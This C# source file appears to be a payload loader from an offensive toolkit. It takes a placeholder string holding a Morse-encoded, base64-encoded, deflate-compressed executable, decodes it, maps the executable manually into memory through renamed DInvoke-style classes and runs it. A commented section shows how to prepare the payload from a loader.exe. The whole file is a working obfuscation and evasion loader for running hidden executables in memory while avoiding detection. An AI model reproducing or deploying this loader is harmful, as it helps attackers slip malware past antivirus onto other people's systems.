using System;
using System.IO;
using System.IO.Compression;
using Sharperner.Execution;
using Sharperner.Execution.ManMap;
using Sharperner.Execution.DyInvoke;
using System.Threading;
using System.Collections.Generic;
using System.Text;
//using Data = DInvoke.Data;
//using DynamicInvoke = DInvoke.DynamicInvoke;
//using ManualMap = DInvoke.ManualMap;

namespace DInvoke
{
    public class MorseForFun
    {
        private static Dictionary<char, string> _morseAlphabetDictionary;

        public static void InitializeDictionary()
        {
            _morseAlphabetDictionary = new Dictionary<char, string>()
                                   {
{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
                                   };
        }

        public static string Send(string input)
        {
            StringBuilder stringBuilder = new StringBuilder();

            foreach (char character in input)
            {
                if (_morseAlphabetDictionary.ContainsKey(character))
                {
                    stringBuilder.Append(_morseAlphabetDictionary[character] + " ");
                }
                else
                {
                    stringBuilder.Append(character + " ");
                }
            }

            return stringBuilder.ToString();
        }
        public static string Receive(string input)
        {
            StringBuilder stringBuilder = new StringBuilder();

            string[] codes = input.Split(' ');

            foreach (var code in codes)
            {
                foreach (char keyVar in _morseAlphabetDictionary.Keys)
                {
                    if (_morseAlphabetDictionary[keyVar] == code)
                    {
                        stringBuilder.Append(keyVar);
                    }
                }
            }

            return stringBuilder.ToString();
        }
    }

    class Program
    {
        public static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dstream.CopyTo(output);
            }
            return output.ToArray();
        }

        public static byte[] Compress(byte[] data)
        {
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
            {
                dstream.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }

        static void Main(string[] args)
        {
            /*
               var b64PEBuffer = @"C:\Users\REUSER\source\repos\ObfuscatorXOR\loader\x64\Release\loader.exe";

               var rawByteArray = File.ReadAllBytes(b64PEBuffer);
               var compByteArray = Compress(rawByteArray);
               var b64String = Convert.ToBase64String(compByteArray);

               Console.WriteLine(b64String);
               */
            string morsedb64string = "REPLACE MORSECODE HERE";

            MorseForFun.InitializeDictionary();

            string b64string = MorseForFun.Receive(morsedb64string);

            var bufferByteArray = Convert.FromBase64String(b64string);
            var deCompByteArray = Decompress(bufferByteArray);

            Pencil.PENCIL_MANUAL_MAP MapMap = Peta.MapThisToMemory(deCompByteArray);
            Menyeluruh.PanggilMapPEMod(MapMap.PEINFO, MapMap.ModuleBase);

            //Data.PE.PE_MANUAL_MAP moduleDetails = ManualMap.Map.MapModuleToMemory("C:\\Windows\\System32\\kernel32.dll");
            //DynamicInvoke.Generic.CallMappedPEModule(moduleDetails.PEINFO, moduleDetails.ModuleBase);

            Thread.Sleep(Timeout.Infinite);
        }
    }
}